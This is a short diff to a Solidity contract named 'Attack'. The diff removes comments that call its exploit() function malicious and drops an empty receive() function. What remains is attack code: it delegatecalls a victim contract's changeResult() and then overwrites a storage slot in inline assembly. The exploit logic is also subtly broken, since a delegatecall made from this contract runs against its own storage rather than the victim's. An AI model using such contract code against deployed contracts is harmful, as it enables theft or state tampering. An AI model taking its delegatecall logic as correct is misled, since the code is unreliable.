@@ -22,20 +22,14 @@ contract Attack {
         victim = addr;
     }
 
-    // Malicious function to exploit the vulnerability in the victim contract
     function exploit() external {
-        // Assemble the data for delegatecall to call changeResult function in victim contract
         bytes memory data = abi.encodeWithSignature("changeResult()");
-        // Execute delegatecall to call changeResult function in victim contract
         (bool success,) = victim.delegatecall(data);
         require(success, "Delegatecall failed");
-        // Manipulate the victim contract's storage slot to achieve the desired result
-        // In this case, setting storageSlot to true
+
         assembly {
             sstore(storageSlot.slot, 1)
         }
     }
     
-    // Fallback function to receive ETH
-    receive() external payable {}
 }
